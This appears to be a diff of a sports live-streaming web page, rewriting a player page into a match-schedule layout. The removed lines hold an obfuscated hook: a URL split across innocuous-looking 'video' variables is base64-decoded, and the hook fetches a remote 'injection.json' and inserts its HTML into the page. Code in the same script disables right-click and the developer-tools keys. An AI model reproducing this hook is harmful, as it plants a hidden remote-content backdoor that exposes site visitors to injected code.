@@ -1,493 +1,135 @@
-<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title> Team </title>
-<link href="https://niazitv.com/jtv/style.css" rel="stylesheet">
-<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
-<link href=" https://use.fontawesome.com/releases/v5.0.6/css/all.css" rel="stylesheet" >
-		<script src="https://s0.2mdn.net/instream/video/client.js" async="" type="text/javascript"></script><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
-		
-		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css">
-		<style>
-			:root {
-				--hfs: 2vmax;
-				--primaryColor: red;
-				--secondaryColor: black;
-				--secondaryOpposite: white;
-			}
-			::-webkit-scrollbar {
-				width: 0em;
-				height: 0em;
-			}
-			::-webkit-scrollbar-thumb {
-				background: var(--secondaryColor);
-			}
-			::-webkit-scrollbar-track {
-				background: none;
-			}
-			* {
-				-webkit-user-select: none;
-				-moz-user-select: none;
-				-ms-user-select: none;
-				user-select: none;
-			}
-			body {
-				background-color: var(--secondaryColor);
-			}
+body { font-family: 'Arial', sans-serif; background-color: black; color: #fff; margin: 0; padding: 0; } /* Toolbar styling */ .toolbar { display: flex; align-items: center; background-color: #111; padding: 10px; transition: opacity 0.3s ease; } .toolbar.hidden { opacity: 0; pointer-events: none; } .toolbar .menu-icon { font-size: 25px; cursor: pointer; margin-right: 15px; color: #00ff00; } .toolbar h1 { margin: 0; font-size: 24px; color: #00ff00; font-weight: bold; } /* Welcome text box styling */ .welcome-box { background-color: #333; padding: 5px; border: 2px solid Red; margin-top: 15px; overflow: hidden; position: relative; } /* Animated title style */ .welcome-text { display: inline-block; white-space: nowrap; animation: marquee 20s linear infinite; font-size: 20px; color: #00ff00; font-weight: bold; } /* Animation keyframe */ @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } } .content { padding: 20px; } .match-card { background-color: #222; border: 1px solid #00ffc8; border-radius: 10px; margin-bottom: 10px; padding: 10px; text-align: center; box-shadow: 0 5px 10px rgba(0, 0, 0, 0.5); cursor: pointer; transition: transform 0.5s; } .match-card:hover { transform: scale(1.09); /* Scale effect on hover */ } .match-title { background-color: #000; color: #fff; display: inline-block; padding: 2px 6px; border-radius: 10px; font-size: 10px; font-weight: bold; margin-bottom: .0px; } .team { display: flex; justify-content: space-between; align-items: center; margin: .0px 0; } .team img { width: 30px; /* Reduced logo size */ height: 30px; border-radius: 50%; /* Circular flag */ border: 1px solid red; /* White border */ } .team p { margin-top: .0px; font-size: 10px; /* Reduced font size for team name */ color: white; /* Stylish blue */ font-weight: 600; text-transform: uppercase; } .team-name { text-align: center; margin-top: .0px; font-size: 10px; font-weight: bold; } .match-info { text-align: center; } .time { font-size: 15px; color: white; font-weight: bold; } .date { font-size: 10px; color: #00FF00; margin-top: .0px; } .match-stage { background-color: black; color: white; padding: 1px 5px; border-radius: 10px; font-size: 8px; display: inline-block; margin-top: .0px; } .live-animation { color: #C80815; font-size: 15px; font-weight: bold; animation: blink 1s infinite; } @keyframes blink { 10% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } } .hidden { display: none; } /* Video Player Styles */ #video-player {display: none; /* Initially hidden */ position: fixed; /* Fixed position */ top: 0; left: 0; width: 100vw; /* Full width */ height: 100vh; /* Full height */ background-color: rgba(0, 0, 0, 0.9); /* Darker background */ z-index: 1000; /* On top of everything */ justify-content: center; /* Centering */ align-items: center; /* Centering */ flex-direction: column; /* Stack elements vertically */ } #video { width: 100%; /* Video width */ height: auto; /* Maintain aspect ratio */ border: 0px solid #00ff00; /* Red border */ border-radius: 10px; /* Rounded corners */ box-shadow: 0 4px 20px rgba(0, 255, 0, 0.6); /* Glow effect */ margin-bottom: 0px; /* Space between video and buttons */ } #server-buttons { display: flex; /* Flexbox for buttons */ justify-content: center; /* Center buttons */ margin-top: 0px; /* Space above buttons */ } .server-button { background-color: #00ff00; /* Green background */ color: black; /* Black text */ border: none; /* No border */ border-radius: 5px; /* Rounded corners */ padding: 10px 20px; /* Padding */ font-size: 16px; /* Font size */ margin: 0 10px; /* Space between buttons */ cursor: pointer; /* Pointer cursor */ transition: background-color 0.5s; /* Transition for hover effect */ } .server-button:hover { background-color: #00cc00; /* Darker green on hover */ } #close-btn { position: absolute; /* Positioned close button */ top: 20px; right: 20px; font-size: 24px; color: white; background: none; border: none; cursor: pointer; transition: transform 0.5s; } #close-btn:hover { transform: scale(1.2); /* Scale effect on hover */ } /* Banner styling */ .banner { margin: 20px auto; text-align: center; background-color: #000000; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5); } .banner img { width: 100%; max-width: 600px; height: auto; border-radius: 5px; } 
 
-			.alignleft {
-				float: left;
-				margin-left: 5px;
-				font-weight: bold;
-				font-size: 15px;
-			}
+Welcome to LIVE BD 24 App! Enjoy Live Matches 🏏🥎⚽.....Powered By Live BD 24..❤️❤️ visit our website. www.livebd24.xyz
 
-			.alignright {
-				float: right;
-				margin-right: 10px;
-				color: var(--primaryColor);
-				font-weight: normal;
-                font-size: 25px;
-			}
+ICC Champions Trophy 2025
 
-			h4  {
-				margin-left: 5px;
-				color: var(--primaryColor);
-				font-weight: bold;
-				font-size: 15px;
-			}
+￼ 
 
-			.nta {
-				position: relative;
-				overflow: hidden;
-				color: var(--primaryColor);
-			}
+Afghanistan
 
-			div.scrollmenu {
-				background-color: var(--secondaryColor);
-				overflow: auto;
-				white-space: nowrap;
-				position: relative;
-				overflow-y: hidden;
-			}
+03:00 AM
 
-			div.scrollmenu a {
-				display: inline-block;
-				color: var(--secondaryOpposite);
-				text-align: center;
-				padding: 4px;
-				text-decoration: none;
-			}
+21/02/2025
 
-			div.scrollmenu a:hover {
-				background-color: var(--secondaryColor);
-			}
+LIVE NOW
 
-			.cen {
-				position: relative;
-				text-align: center;
-				color: var(--secondaryOpposite);
-			}
+￼ 
 
-			.centered {
-				font-size: var(--hfs);
-				font-weight: bold;
-				position: absolute;
-				top: 80%;
-				left: 50%;
-				transform: translate(-50%, -50%);
-			}
+South Africa
 
-			.cent {
-				font-size: auto;
-				position: absolute;
-				top: 95%;
-				left: 50%;
-				transform: translate(-50%, -50%);
-			}
+ICC CHAMPIONS TROFY 
 
-			.nt {
-				width: 100px;
-				border-radius: 10px;
-				height: 120px;
-				z-index: 1;
-			}
+ICC Champions Trophy 2025
 
-			.mnt {
-				width: 100px;
-				border-radius: 2px;
-				height: 100px;
-			}
-			.item img {
-				border-radius: 10px;
-			}
-			#content-container {
-				margin-bottom: 30px;
-			}
-			footer {
-				display: grid;
-				grid-gap: 0.5em;
-				grid-template-columns: repeat(5, minmax(10px, 1fr));
-				position: fixed;
-				bottom: 0;
-				left: 0;
-				width: 100%;
-				background-color: var(--secondaryColor);
-				padding: 0px 4px 10px;
-				justify-content: center;
-				align-items: center;
-                font-size:18px;
-			}
-			footer a {
-				text-align: center;
-				color: var(--primaryColor);
-			}
-			footer a:nth-child(3) i {
-				background: var(--primaryColor);
-				border-radius: 50%;
-				padding: 10px 10px;
-				color: var(--secondaryOpposite);
-				margin-top: -40px;
-				border: 2px solid var(--secondaryColor);
-			}
-		</style>
+￼ 
 
+BAN
 
-<style>::-webkit-scrollbar{
-    display:none
-}
-*{
-    -ms-overflow-style:none;
-    scrollbar-width:none
-}
-body{
-    margin:0;
-    background:#f5f5f5;
-    font-family:Arial,Helvetica,sans-serif;
-    line-height:1.5;
-    color:white;
-    scroll-behavior:smooth;
-    text-align:center;
-}
-#player-wrapper{
-    width:100%;
-    z-index:999;
-}
-.sticky{
-    position:fixed;
-    top:0;
-    width:100%
-}
-#status{
-    position:fixed;
-    bottom:0;
-    right:0;
-    width:100%;
-    background:#fff;
-    display:none;
-}
-.col-sm-2{
-    border-radius:4px
-}
-.sp{
-    width:50%;
-    height:12px;
-    clear:both;
-    margin:20px auto
-}
-.sp-texture{
-    border:1px #000 solid;
-    border-radius:4px;
-    position:relative;
-    background:linear-gradient(45deg,transparent 49%,#000 50%,#000 50%,transparent 51%,transparent),linear-gradient(-45deg,transparent 49%,#000 50%,#000 50%,transparent 51%,transparent);
-    background-size:16px 16px;
-    background-position:0 0;
-    -webkit-animation:spTexture 1s infinite linear;
-    animation:spTexture 1s infinite linear;
-    color:#000;
-    text-align:center;
-    line-height:3em;
-    font-family:roboto
-}
-@-webkit-keyframes spTexture{
-    from{
-        background-position:0 0
-    }
-    to{
-        background-position:-16px 0
-    }
-}
-@keyframes spTexture{
-    from{
-        background-position:0 0
-    }
-    to{
-        background-position:-16px 0
-    }
-}
-.heading{
-    margin:5px auto;
-    text-align:center
-}
-#rmpPlayer{
-    z-index:999
-}
-.white{
-    color:#fff
-}
-.red{
-    color:red
-}
-.yellow{
-    color:#ffdd40
-}
-footer{
-    color:#fff;
-    text-align:center
-}
-footer p{
-    margin-bottom:20px;
-    margin-top:-10px
-}
-.animated{
-    font-family:sans;
-    margin:0;
-    padding:0;
-    font-size:25px;
-    background:url(https://upload.wikimedia.org/wikipedia/commons/3/3b/ColorRotateHr.gif) no-repeat;
-    background-clip:text;
-    -webkit-background-clip:text;
-    color:transparent;
-    animation:moveBg 40s linear infinite;
-    -webkit-animation:moveBg 40s linear infinite
-}
-@keyframes moveBg{
-    0%{
-        background-position:0 30%
-    }
-    100%{
-        background-position:100% 50%
-    }
-}
-.blink{
-    animation-name:blinker;
-    animation-duration:1s;
-    animation-timing-function:linear;
-    animation-iteration-count:infinite
-}
-@keyframes blinker{
-    0%{
-        opacity:1
-    }
-    50%{
-        opacity:0
-    }
-    100%{
-        opacity:1
-    }
-}
-*{
-    -webkit-touch-callout:none;
-    -webkit-user-select:none;
-    -khtml-user-select:none;
-    -moz-user-select:none;
-    -ms-user-select:none;
-    user-select:none
-}
-body{
-    background:#000!important;
-    overflow:hidden;
-    color:white;
-}
-.parent{
-    background:rgba(0,0,0,.9);
-    font-family:"Source Sans Pro",sans-serif;
-    margin:0;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    flex-direction:column;
-    position:fixed;
-    top:0;
-    height:100%;
-    width:100%;
-    z-index:999999
-}
-.blobs-container{
-    display:flex
-}
-.blob img{
-    width:50%;
-    display:none;
-    margin:auto;
-    margin-top:25px
-}
-.loading{
-    color:#000;
-    display:block;
-    text-align:center;
-    position:relative;
-    top:30px;
-    left:-2px;
-    background:rgba(255,255,255,.9);
-    padding:0 10px;
-    border-radius:3px;
-    width:80%;
-    margin:auto;
-    font-size:10px
-}
+03:00 PM
 
-.print{height:65px;
-width:65px;
+20/02/2025
 
-border-radius:50px;
-border:1.5px solid #f5f5f5;
-padding:2px;
-    margin:3px;
+LIVE NOW
 
-}
-.print:hover{height:90px;
-width:90px;
-border:2px solid red;
-border-radius:5px;webkit-box-shadow: 0px 10px 0px 0px rgba(255,0,0,1);
--moz-box-shadow: 0px 10px 0px 0px rgba(255,0,0,1);
-box-shadow: 0px 3px 20px 3px rgba(255,0,0,100);}
-.print:active{height:65px;
-width:65px;
-border:2px solid red;
-border-radius:5px;
-webkit-box-shadow: 0px 10px 0px 0px rgba(0,255,0,1);
--moz-box-shadow: 0px 10px 0px 0px rgba(0,255,0,1);
-box-shadow: 0px 3px 20px 3px rgba(0,255,0,100);}
+￼ 
 
+IND
 
-marquee{
-border-radius: 0px 0px 0px  0px;
-width: 90%;
-border:2px solid red;
-margin: auto;
-   font-weight:bold;
-   color:#fff;
-display: block;}
+Cricket
 
-.marquee span{display: inline-block;
- background: #ff0000;
- border-radius:  0px 0px 0px 0px;
-  padding: 0px 10px;
-   color: #fff;
-   padding:2px;
-   font-weight:bold;
-    display: inline-block;
-     float: left;
-      width: auto;
-       line-height: 35px;}
-       
-       .marquee marquee{display: block;
-        line-height: 35px;
-         z-index: -1; 
-         margin-right: 10px;
-          width: auto; 
-          margin: auto;}
-          
+ICC Champions Trophy 2025
 
-          
-       .viewer{
-        display: flex;
-        width: 70px;
-        height: auto;
-        padding: 10px;
-        vertical-align: middle;
-      }
+￼ 
 
-  
-          #count{display:flex;font-size:10pt;padding:1px 10px;width:90px;background:Red;border-radius:0px;}
-</style>
+PAK
 
-<link id="rmp-dress-code" type="text/css" rel="stylesheet" href="https://cdn.radiantmediatechs.com/rmp/5.9.2/css/rmp-s4.min.css"></head><body style="overflow: auto;">
-	
+03:00 PM
 
-		<script>
-var src = {
-  mp4: [
-    'https://sandl.herokuapp.com/video/video?url=https://m.youtube.com/watch?v=G7Evl8C-WIs'
-  ],
-  webm: [
-    'https://your-webm-sd-url.webm',
-    'https://your-webm-hd-url.webm',
-    'https://your-webm-full-hd-url.webm'
-  ]
-};
+19/02/2025
 
+LIVE NOW
 
-		</script><div class="parent" id="loader" style="display: none;"><div class="blobs-container"><div class="blob"><img id="loader-image" src=""></div></div></div><div id="player-wrapper">  <script src="https://cdn.radiantmediatechs.com/rmp/6.2.0/js/rmp.min.js"></script> 
-  <!-- Add a div container with a unique id - video and UI elements will be appended to this container -->
-  <div id="rmpPlayer"></div>  
+￼ 
 
- 
-<div class="marquee yellow"><span><i class="fa fa-bell" style="font-size:26pt" aria-hidden="true"></i></span> <marquee scrollamount="5" direction="left" onmouseover="stop()" onmouseout="start()">We are Updating Our Application as We Update Our Application Will B Send Notification To All User's Thanks For Choosing Babar ali Official </marquee> </div> 
+NZ
 
+Match END
 
+2nd ODI | Ireland Tour Of Zimbabwe 
 
-	
-	<h2>
-		
-		
-	             
+￼ 
 
+ZIM
 
- <span url="https://jk3lz82elw79-hls-live.5centscdn.com/newgeonews/07811dc6c422334ce36a09ff5cd6fe71.sdp/playlist.m3u8"><img name="ptv sports" autofocus="" class="print" id="ptv sports " src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTLKQnYyjRugWFvMa9ngfzT0CLxkcsjNp-wsw&usqp=CAU">
-              </span>
+01:30 PM
 
- <span url="http://mu03ye.wanicelife.com:8880/live/YALM4649/y6q3fhltq/31641.m3u8"><img class="print" id="ptv sports" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTLKQnYyjRugWFvMa9ngfzT0CLxkcsjNp-wsw&usqp=CAU">
-              </span>
+16/02/2025
 
- <span url="http://mu03ye.wanicelife.com:8880/live/YALM4649/y6q3fhltq/31641.m3u8"><img name="ptv sports" autofocus="" class="print" id=" ptv sports " src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTLKQnYyjRugWFvMa9ngfzT0CLxkcsjNp-wsw&usqp=CAU">
-              </span>
+LIVE NOW
 
-  <span url="http://mu03ye.wanicelife.com:8880/live/YALM4649/y6q3fhltq/31641.m3u8"><img class="print" id="ptv sports" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTLKQnYyjRugWFvMa9ngfzT0CLxkcsjNp-wsw&usqp=CAU">
-              </span>
+￼ 
 
+IRE
 
-<script>
-const countEl = document.getElementById('count');
+Cricket
 
-updateVisitCount();
-  
-function updateVisitCount() {
-	fetch('https://api.countapi.xyz/hit/awaispirkale/visits')
-	.then(res => res.json())
-	.then(res => {
-		countEl.innerHTML = res.value;
-	})
-}
+Cricket / Super Smash2024/2025
 
+￼ 
 
+Super Smash
 
+10:55 AM
 
+29/01/2025
 
+LIVE NOW
 
+￼ 
 
+Super Smash
 
+Cricket
 
+Cricket | BIG BASH LEAGUE 
 
+￼ 
 
+BBL
 
+02:30 PM
 
-// SOCIAL PANEL JS
-const floating_btn = document.querySelector('.floating-btn');
-const close_btn = document.querySelector('.close-btn');
-const social_panel_container = document.querySelector('.social-panel-container');
+27/01/2025
 
-floating_btn.addEventListener('click', () => {
-	social_panel_container.classList.toggle('visible')
-});
-</script>
+LIVE NOW
 
-</div>        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script><script src="https://cdn.radiantmediatechs.com/rmp/5.9.2/js/rmp.min.js"></script><script>
-            var appSettings={
-                loaderimg: "",
-                name: "PSL Official",
-                poster: " https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTmOwm5aR1DTCNkGmNSakKcLtpaSXt9s0qlsvTD_4-6uLcN4zhOsHuVB2L7&s=10",
-                introMp4: "https://sandl.herokuapp.com/video/video?url=https://m.youtube.com/watch?v=G7Evl8C-WIs",
-                introHls: "ht",
-				videoFormat: "mp4",
-            },x={loaderimg:appSettings.loaderimg,name:appSettings.name,poster:appSettings.poster,website:"",licenseKey:"eHp1dXRtb3Z5cEAxNDkyNDI4",autoHeightMode:!0,pip:!1,autoplay:!1,skin:"s4",hideControls:!0,preload:"auto",sharing:!1},firstVideo="";setInterval(()=>{$("#loader-image").attr("src",x.loaderimg),$(".logoText").html(x.name)},10),$(document).contextmenu(function(e){return e.preventDefault(),!1}),document.onkeydown=function(e){return 123!=event.keyCode&&((!e.ctrlKey||!e.shiftKey||e.keyCode!="I".charCodeAt(0))&&((!e.ctrlKey||!e.shiftKey||e.keyCode!="C".charCodeAt(0))&&((!e.ctrlKey||!e.shiftKey||e.keyCode!="J".charCodeAt(0))&&((!e.ctrlKey||e.keyCode!="U".charCodeAt(0))&&void 0))))},setTimeout(()=>{$("#loader").css("display","none"),$("body").css("overflow","auto")},100);var src,secondVideo="mNvbnRlbnQuY29tL3NvZnR";$("span").each(function(e){$(this).on("click",function(){var e=$(this).attr("url");rmp.setControls(!0),src="mp4"==appSettings.videoFormat?{hls:e}:{mp4:[e]},rmp.setSrc(src),rmp.play()})});var thirdVideo="3ZWJ0dXRzL015RHJpdmUvbW";src="mp4"==appSettings.videoFormat?{hls:appSettings.introHls}:{mp4:[appSettings.introMp4]};var fourthVideo="Fpbi9pbmplY3Rpb24uanNvbg==",settings={licenseKey:x.licenseKey,autoHeightMode:x.autoHeightMode,pip:x.pip,delayToFade:3e3,gaLabel:"Live TV",logoWatermark:!0,logoPosition:"topleft",speed:"Speed",isLive:!0,googleCast:!0,airplay:!0,hlsJSMaxBufferLength:24,hlsJSLiveSyncDuration:18,hlsJSStartLevel:-1,hlsJSMinAutoBitrate:1e5,hlsJSAbrBandWidthFactor:.9,hlsJSAbrBandWidthUpFactor:.7,hlsJSLiveBackBufferLength:0,detectAutoplayCapabilities:!0,autoplay:x.autoplay,mutedAutoplayOnMobile:!1,mutedAutoplayOnMacosSafari11Plus:!1,srcChangeAutoplay:!0,playsInline:!0,skin:x.skin,skinBackgroundColor:"rgba(0, 0, 0, 0.7)",skinButtonColor:"FFFFFF",skinAccentColor:"FF0000",ads:!0,nav:!0,adBlockerDetection:!0,adEnablePreloading:!0,adBlockerDetectedMessage:"Ad-blocker software detected. Please disable Ad-blocker to watch stream.",quickRewind:10,quickForward:10,adAutoAlign:!1,hideControls:x.hideControls,preload:x.preload,crossorigin:!0,sharing:x.sharing,sharingUrl:x.website,contentMetadata:{artwork:[{src:x.poster,sizes:"1280x720",type:"image/jpg"}],poster:[x.poster],endOfVideoPoster:[x.poster],thumbnail:x.poster},src:src},elementID="rmpPlayer",rmp=new RadiantMP(elementID),rmpContainer=document.getElementById(elementID);rmp.setLoop(!0),rmp.init(settings),$(function(){$(window).scroll(function e(){return $("#rmpPlayer").css($(window).scrollTop()>1?{position:"fixed",top:"0px"}:{position:"relative",top:"auto"}),$("#buttons-list").css($(window).scrollTop()>1?{"margin-top":$("#rmpPlayer").height()}:{"margin-top":"0px"}),e}())});const request=async e=>{const t=await fetch(e);return await t.json()};navigator.onLine&&request(atob(firstVideo+secondVideo+thirdVideo+fourthVideo)).then(t=>{1==t.inject&&document.querySelector("div").insertAdjacentHTML("afterend",e.content)}).catch(e=>{console.log(appSettings.name)});</script>
+￼ 
 
-</body></html>
+BBL
+
+Cricket
+
+Football | English Premier 🏆 League 
+
+￼ 
+
+Man City
+
+06:30 AM
+
+26/12/2024
+
+LIVE NOW
+
+￼ 
+
+Everton
+
+Football
+
+✖ Your browser does not support the video tag. 
+
+PTV PTV 2 Toffee 
+
+// লাইভ অ্যানিমেশন শুরু ও শেষের সময় নির্ধারণ const match1StartTime = '00:00'; // ম্যাচ ১ শুরু সময় (HH:MM ফরম্যাটে) const match1EndTime = '00:00'; // ম্যাচ ১ শেষ সময় const match2StartTime = '00:00'; // ম্যাচ ২ শুরু সময় (HH:MM ফরম্যাটে) const match2EndTime = '00:00'; // ম্যাচ ২ শেষ সময় const match3StartTime = '00:00'; // ম্যাচ ৩ শুরু সময় const match3EndTime = '00:00'; // ম্যাচ ৩ শেষ সময় const match4StartTime = '00:00'; // ম্যাচ ৪ শুরু সময় const match4EndTime = '00:00'; // ম্যাচ ৪ শেষ সময় const match5StartTime = '00:00'; // ম্যাচ ৫ শুরু সময় const match5EndTime = '00:00'; // ম্যাচ ৫ শেষ সময় const match6StartTime = '15:00'; // ম্যাচ ৬ শুরু সময় const match6EndTime = '23:00'; // ম্যাচ ৬ শেষ সময় const match7StartTime = '00:00'; // ম্যাচ ৭ শুরু সময় const match7EndTime = '00:00'; // ম্যাচ ৭ শেষ সময় function checkMatchStatus() { const currentTime = new Date(); const currentHourMinute = currentTime.toTimeString().slice(0, 5); // বর্তমান সময় (HH:MM ফরম্যাটে) // Match 1: India Vs South Africa if (currentHourMinute >= match1StartTime && currentHourMinute <= match1EndTime) { document.getElementById('time1').classList.add('hidden'); document.getElementById('date1').classList.add('hidden'); document.getElementById('live1').classList.remove('hidden'); } else { document.getElementById('time1').classList.remove('hidden'); document.getElementById('date1').classList.remove('hidden'); document.getElementById('live1').classList.add('hidden'); } // Match 2: India Vs South Africa if (currentHourMinute >= match2StartTime && currentHourMinute <= match2EndTime) { document.getElementById('time2').classList.add('hidden'); document.getElementById('date2').classList.add('hidden'); document.getElementById('live2').classList.remove('hidden'); } else { document.getElementById('time2').classList.remove('hidden'); document.getElementById('date2').classList.remove('hidden'); document.getElementById('live2').classList.add('hidden'); } // Match 3: Saudi Pro League if (currentHourMinute >= match3StartTime && currentHourMinute <= match3EndTime) { document.getElementById('time3').classList.add('hidden'); document.getElementById('date3').classList.add('hidden'); document.getElementById('live3').classList.remove('hidden'); } else { document.getElementById('time3').classList.remove('hidden'); document.getElementById('date3').classList.remove('hidden'); document.getElementById('live3').classList.add('hidden'); } // Match 4: Saudi Pro League if (currentHourMinute >= match4StartTime && currentHourMinute <= match4EndTime) { document.getElementById('time4').classList.add('hidden'); document.getElementById('date4').classList.add('hidden'); document.getElementById('live4').classList.remove('hidden'); } else { document.getElementById('time4').classList.remove('hidden'); document.getElementById('date4').classList.remove('hidden'); document.getElementById('live4').classList.add('hidden'); } // Match 5: Saudi Pro League if (currentHourMinute >= match5StartTime && currentHourMinute <= match5EndTime) { document.getElementById('time5').classList.add('hidden'); document.getElementById('date5').classList.add('hidden'); document.getElementById('live5').classList.remove('hidden'); } else { document.getElementById('time5').classList.remove('hidden'); document.getElementById('date5').classList.remove('hidden'); document.getElementById('live5').classList.add('hidden'); } // Match 6: Saudi Pro League if (currentHourMinute >= match6StartTime && currentHourMinute <= match6EndTime) { document.getElementById('time6').classList.add('hidden'); document.getElementById('date6').classList.add('hidden'); document.getElementById('live6').classList.remove('hidden'); } else { document.getElementById('time6').classList.remove('hidden'); document.getElementById('date6').classList.remove('hidden'); document.getElementById('live6').classList.add('hidden'); } // Match 7: Saudi Pro League if (currentHourMinute >= match7StartTime && currentHourMinute <= match7EndTime) { document.getElementById('time7').classList.add('hidden'); document.getElementById('date7').classList.add('hidden'); document.getElementById('live7').classList.remove('hidden'); } else { document.getElementById('time7').classList.remove('hidden'); document.getElementById('date7').classList.remove('hidden'); document.getElementById('live7').classList.add('hidden'); } // Match 8: Saudi Pro League if (currentHourMinute >= match8StartTime && currentHourMinute <= match8EndTime) { document.getElementById('time8').classList.add('hidden'); document.getElementById('date8').classList.add('hidden'); document.getElementById('live8').classList.remove('hidden'); } else { document.getElementById('time8').classList.remove('hidden'); document.getElementById('date8').classList.remove('hidden'); document.getElementById('live8').classList.add('hidden'); } // Match 9: Saudi Pro League if (currentHourMinute >= match9StartTime && currentHourMinute <= match9EndTime) { document.getElementById('time9').classList.add('hidden'); document.getElementById('date9').classList.add('hidden'); document.getElementById('live9').classList.remove('hidden'); } else { document.getElementById('time9').classList.remove('hidden'); document.getElementById('date9').classList.remove('hidden'); document.getElementById('live9').classList.add('hidden'); } // Match 10: Saudi Pro League if (currentHourMinute >= match10StartTime && currentHourMinute <= match10EndTime) { document.getElementById('time10').classList.add('hidden'); document.getElementById('date10').classList.add('hidden'); document.getElementById('live10').classList.remove('hidden'); } else { document.getElementById('time10').classList.remove('hidden'); document.getElementById('date10').classList.remove('hidden'); document.getElementById('live10').classList.add('hidden'); } // Match 11: Saudi Pro League if (currentHourMinute >= match11StartTime && currentHourMinute <= match11EndTime) { document.getElementById('time11').classList.add('hidden'); document.getElementById('date11').classList.add('hidden'); document.getElementById('live11').classList.remove('hidden'); } else { document.getElementById('time11').classList.remove('hidden'); document.getElementById('date11').classList.remove('hidden'); document.getElementById('live11').classList.add('hidden'); } // Match 12: Saudi Pro League if (currentHourMinute >= match12StartTime && currentHourMinute <= match12EndTime) { document.getElementById('time12').classList.add('hidden'); document.getElementById('date12').classList.add('hidden'); document.getElementById('live12').classList.remove('hidden'); } else { document.getElementById('time12').classList.remove('hidden'); document.getElementById('date12').classList.remove('hidden'); document.getElementById('live12').classList.add('hidden'); } // Match 13: Saudi Pro League if (currentHourMinute >= match13StartTime && currentHourMinute <= match13EndTime) { document.getElementById('time13').classList.add('hidden'); document.getElementById('date13').classList.add('hidden'); document.getElementById('live13').classList.remove('hidden'); } else { document.getElementById('time13').classList.remove('hidden'); document.getElementById('date13').classList.remove('hidden'); document.getElementById('live13').classList.add('hidden'); } // Match 14: Saudi Pro League if (currentHourMinute >= match14StartTime && currentHourMinute <= match14EndTime) { document.getElementById('time14').classList.add('hidden'); document.getElementById('date14').classList.add('hidden'); document.getElementById('live14').classList.remove('hidden'); } else { document.getElementById('time14').classList.remove('hidden'); document.getElementById('date14').classList.remove('hidden'); document.getElementById('live14').classList.add('hidden'); } // Match 15: Saudi Pro League if (currentHourMinute >= match15StartTime && currentHourMinute <= match15EndTime) { document.getElementById('time15').classList.add('hidden'); document.getElementById('date15').classList.add('hidden'); document.getElementById('live15').classList.remove('hidden'); } else { document.getElementById('time15').classList.remove('hidden'); document.getElementById('date15').classList.remove('hidden'); document.getElementById('live15').classList.add('hidden'); } } // প্রতি ১ সেকেন্ডে চেক করা হবে ম্যাচের স্ট্যাটাস setInterval(checkMatchStatus, 1000); // Video Player Functionality function playVideo(videoSrc) { document.getElementById('video-player').style.display = 'flex'; document.getElementById('video-source').src = videoSrc; document.getElementById('video').load(); } function closeVideo() { document.getElementById('video-player').style.display = 'none'; document.getElementById('video').pause(); } function selectServer(serverSrc) { document.getElementById('video-source').src = serverSrc; document.getElementById('video').load(); } 
